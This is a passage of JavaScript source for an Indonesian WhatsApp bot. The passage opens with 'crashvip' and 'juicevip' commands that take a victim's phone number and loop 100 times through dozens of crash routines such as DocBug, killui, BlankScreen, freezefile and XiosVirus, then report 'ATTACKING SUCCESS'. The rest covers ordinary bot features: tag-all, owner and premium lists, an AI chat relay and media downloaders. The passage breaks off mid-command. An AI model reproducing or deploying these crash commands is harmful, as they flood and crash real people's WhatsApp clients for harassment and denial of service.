case 'crashvip-v6': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip-v7': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip-v8': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip-v9': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
if (!isPremium) return reply(" Khusus Owner *Juice Crash* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 100; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await f10(target, Ptcp = true);
await func1(target);
await killui(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target)
await iponcrash(target)
await f10(target, Ptcp = true);
await thunderblast_notif(target);
await LocSystem(target);
await f10(target, Ptcp = true);
await killui(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await Bug2(target);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await f10(target, Ptcp = true);
await func1(target);
await killui(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await LocSystem(target);
await XiosVirus(target);
await QDIphone(target);
await QPayIos(target);
await QPayStriep(target);
await FBiphone(target);
await VenCrash(target);
await AppXCrash(target);
await SmCrash(target);
await SqCrash(target);
await XiosVirus(target);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'juicevip-v1': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v2': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v3': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v4': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v5': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v6': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v7': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v8': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
case 'juicevip-v9': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 ⪼*
if (!isPremium) return reply(" Khusus Owner *Juice Crash* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 100; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await f10(target, Ptcp = true);
await func1(target);
await killui(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target)
await iponcrash(target)
await f10(target, Ptcp = true);
await thunderblast_notif(target);
await LocSystem(target);
await f10(target, Ptcp = true);
await killui(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await Bug2(target);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await f10(target, Ptcp = true);
await func1(target);
await killui(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
await crashX(target);
await aipong(target);
await iponcrash(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await LocSystem(target);
await XiosVirus(target);
await QDIphone(target);
await QPayIos(target);
await QPayStriep(target);
await FBiphone(target);
await VenCrash(target);
await AppXCrash(target);
await SmCrash(target);
await SqCrash(target);
await XiosVirus(target);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

 //GAK USAH RENAME, KETAHUAN REANAME TANGGUNG RESIKO LU SENDIR

case "hidetag": case "z": case "h": case " ht": {
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
AndraZyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break

case "public": {
if (!isPremium) return reply(" maaf kamu tidak memiliki akses ")
AndraZyy.public = true
reply(`*berhasil mengubah bot ke mode public*`)
}
break

case "self": {
if (!isPremium) return reply(" maaf kamu tidak memiliki akses ")
AndraZyy.public = false
reply(`*berhasil mengubah bot ke mode self*`)
}
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
AndraZyy.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "addowner": case "addown":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 1849×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await AndraZyy.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner": case "delown":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 1849×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'addprem':
if (!args[0]) return reply(`Use ${prefix+command} number\nContoh ${prefix+command} 1849xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await AndraZyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./database/dtbs/premium.json', JSON.stringify(premium))
reply(`oke ${prrkek} telah diberikan akses`)
break

case 'delprem':
if (!args[0]) return reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 1849xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/dtbs/premium.json', JSON.stringify(premium))
reply(`yah ${ya} tidak memiliki akses lagi`)
break

/**
  * Andrazyy
  * don't forget to follow
  * https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q
*/

case "ai": case "leptonai": case "letmegpt": {
    if (!text) return m.reply("Masukan teks!");
    axios({
        method: 'POST',
        url: 'https://api.manaxu.my.id/api/ai/search',
        headers: {
            'x-api-key': 'key-manaxu-free',
            'Content-Type': 'application/json'
        },
        data: {
            question: text,
            model: command
        }
    })
    .then(_ => {
        m.reply(_.data.result);
    })
    .catch(e => {
        m.reply(e.message);
        console.error(e);
    });
}
break;

/**
  * Feature Ai With Logic & Sessions Made by Andrazyy
  * Don't forget to follow
  * https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q
*/

case "ai": {
  if (!text) return m.reply("Ada apa?");
  const aiSessions = shyzu.ai_sessions ?? {};
  const senderId = m.sender;

  if (!aiSessions[senderId]) {
    aiSessions[senderId] = { messages: [] };
  }

  const msgs = [
    ...aiSessions[senderId].messages,
    { content: text, role: "user" }
  ];

  const api_url = 'https://api.manaxu.my.id/api/ai';
  const api_key = 'key-manaxu-free';

  axios({
    method: 'POST',
    url: api_url,
    headers: {
      'x-api-key': api_key,
      'Content-Type': 'application/json'
    },
    data: {
      logic: 'nama kamu adalah Shyzu, assistent AI cerdas buatan MannR.',
      messages: msgs
    }
  })
  .then(response => {
    if (response.status === 200) {
      const { result } = response.data;
      m.reply(result ?? "Hmmm sepertinya terjadi kesalahan pada API, Minta bantuan ke owner ya.");
      aiSessions[senderId].messages.push({ content: text, role: "user" });
      aiSessions[senderId].messages.push({ content: result, role: "assistant" });
      shyzu.ai_sessions = aiSessions;
    } else {
      m.reply("Hmmm sepertinya terjadi kesalahan pada API, Minta bantuan ke owner ya.");
    }
  })
  .catch(error => {
    console.error(error);
    m.reply("Hmmm sepertinya terjadi kesalahan, Minta bantuan ke owner ya.");
  });
}
break;

//===========TOOLS MENU=========//
case 'tiktok': case 'tt': {
  if (!text) return reply(`Contoh: ${prefix + command} link`);
  reply("Mohon Tunggu Sebentar...")
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*
 *Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_
\`⏤͟͟͞͞ Downloader By ${global.namaOwner}\`
`;
 AndraZyy.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
}
break

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("dengan mengirim/reply foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
reply("Mohon Tunggu Sebentar...")
var media = await AndraZyyt.downloadAndSaveMediaMessage(qmsg)
await AndraZyy.sendStimg(m.chat, media, m, {packname: `𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 ${namaBot} 👑`})
await fs.unlinkSync(media)
}
break

case 'splay': {
 const axios = require("axios");
 if (!text) return m.reply('Masukkan Judul Contoh\nContoh `Kewer Kewer`');

 await reply("Mohon Tunggu Sebentar...");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
 if (!data) return reply("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await AndraZyy.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await AndraZyy.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan file audio.");
 }
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat mengambil file audio.");
 }
}
break

case 'hd':
case 'hdr': 
case 'hdimg':
case 'remini':
case 'enhance': {
